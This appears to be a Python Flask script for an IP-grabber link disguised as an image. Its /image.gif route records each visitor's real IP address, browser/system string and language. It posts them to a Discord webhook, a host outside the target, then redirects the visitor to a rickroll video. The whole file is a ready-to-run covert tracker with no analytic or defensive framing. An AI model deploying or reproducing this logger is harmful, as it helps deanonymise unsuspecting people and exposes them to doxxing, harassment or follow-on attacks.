from flask import Flask, request, redirect
import requests
app = Flask(__name__)
DISCORD_WEBHOOK_URL = "Discord Webhook Token"
@app.route("/image.gif")
def logger():
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    user_language = request.headers.get('Accept-Language')
    print(f"IP: {ip} User-Agent: {user_agent} Language: {user_language}")
    
    log_message = (
        f"🎯 **User Data**\n"
        f"🌐 **Real IP:** `{ip}`\n"
        f"💾 **Language:** `{user_language}`\n"
        f"📱 **Browser/System:** `{user_agent}`"
    )
    requests.post(DISCORD_WEBHOOK_URL, json={"content": log_message})
    return redirect("https://cdn.mtdv.me/video/rick.mp4")

if (__name__) == '__main__':
    app.run(port=8080)